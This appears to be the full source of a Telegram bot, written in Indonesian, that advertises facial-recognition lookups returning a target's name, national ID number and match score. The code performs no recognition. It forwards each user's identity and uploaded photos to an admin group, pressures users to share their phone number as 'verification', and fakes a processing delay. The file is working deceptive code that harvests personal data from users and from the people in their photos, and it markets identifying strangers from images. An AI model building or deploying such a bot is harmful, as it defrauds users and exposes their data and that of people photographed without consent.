import os
import asyncio
import logging
from datetime import datetime
from dotenv import load_dotenv

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# --- KONFIGURASI LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
try:
    # Mengambil ADMIN_ID dari .env
    ADMIN_ID = int(os.getenv("ADMIN_GROUP_ID").strip())
except Exception as e:
    logger.error(f"Gagal memuat ADMIN_GROUP_ID: {e}")
    ADMIN_ID = None

# --- HANDLER /START ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    # Mengambil username, jika tidak ada diberi keterangan
    username = f"@{user.username}" if user.username else "Tidak memiliki Username"
    
    welcome_text = (
        f"👋 HALO, {user.first_name}!\n"
        f"🆔 ID: `{user.id}`\n"
        f"👤 Username: {username}\n"
        "--------------------------------------------\n"
        "✨ **SELAMAT DATANG DI BOT FR TESTING** ✨\n"
        "📊 (KUOTA 10/DAY)\n\n"
        "**CARA PENGGUNAAN BOT:**\n\n"
        "1️⃣ Kirimkan **FOTO TARGET** (Tampak depan & jelas).\n"
        "2️⃣ Sistem akan melakukan pengecekan dalam waktu cepat untuk akurasi tinggi.\n"
        "3️⃣ Bot akan menampilkan Nama, NIK, dan Persentase Kemiripan.\n"
        "4️⃣ Operasional: **06.00 WIB - 21.00 WIB**.\n"
        "5️⃣ Gunakan akses dengan bijak. Terimakasih.\n\n"
        "🚀 *Selamat bertugas, semoga sukses selalu!*"
    )

    # Kirim pesan ke User
    await update.message.reply_text(welcome_text, reply_markup=ReplyKeyboardRemove(), parse_mode='Markdown')

    # Kirim Notifikasi ke Admin bahwa ada user baru klik /start
    if ADMIN_ID:
        try:
            admin_msg = (
                "🔔 **USER BARU TERDETEKSI**\n"
                f"👤 Nama: {user.full_name}\n"
                f"🆔 ID: `{user.id}`\n"
                f"🏷 Username: {username}"
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Gagal kirim log start ke admin: {e}")

# --- HANDLER FOTO ---
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    username = f"@{user.username}" if user.username else "N/A"
    photo_id = update.message.photo[-1].file_id
    
    # 1. Beri notifikasi foto diterima
    await update.message.reply_text("📥 Foto diterima. Menunggu verifikasi identitas...")

    # 2. Munculkan Tombol Kontak sebagai syarat
    contact_keyboard = [[KeyboardButton("📱 KLIK DISINI UNTUK VERIFIKASI KONTAK", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(contact_keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "⚠️ Untuk memproses foto ini, silakan verifikasi kontak Anda terlebih dahulu melalui tombol di bawah:",
        reply_markup=reply_markup
    )

    # 3. Teruskan foto ke admin sebagai backup/log
    if ADMIN_ID:
        try:
            await context.bot.send_photo(
                chat_id=ADMIN_ID,
                photo=photo_id,
                caption=f"📸 **FOTO MASUK (Menunggu Kontak)**\nUser: {user.full_name}\nUsername: {username}\nID: `{user.id}`",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Gagal kirim foto ke admin: {e}")

# --- HANDLER KONTAK ---
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_contact = update.message.contact
    
    # 1. Kirim pesan proses ke user dan hapus keyboard
    await update.message.reply_text(
        "✅ Verifikasi berhasil. Identitas tervalidasi.",
        reply_markup=ReplyKeyboardRemove()
    )
    
    # Simulasi loading
    await asyncio.sleep(1.5)
    await update.message.reply_text("🔍 Sedang diproses oleh sistem...")

    # 2. Kirim data kontak lengkap ke Admin
    if ADMIN_ID:
        try:
            info_kontak = (
                "📱 **VERIFIKASI KONTAK BERHASIL**\n"
                "---------------------------\n"
                f"👤 Nama: {user_contact.first_name} {user_contact.last_name or ''}\n"
                f"📞 No Telp: `{user_contact.phone_number}`\n"
                f"🆔 ID Telegram: `{user_contact.user_id}`\n"
                "---------------------------"
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=info_kontak, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Gagal kirim kontak ke admin: {e}")

# --- MAIN ---
if __name__ == '__main__':
    if not TOKEN or not ADMIN_ID:
        print("❌ KESALAHAN: Cek file .env! TOKEN atau ADMIN_GROUP_ID belum terisi.")
        exit()

    app = ApplicationBuilder().token(TOKEN).build()

    # Registrasi Handler
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))

    print(f"🚀 Bot Berhasil Dijalankan... Memonitor Admin ID: {ADMIN_ID}")
    app.run_polling(drop_pending_updates=True)
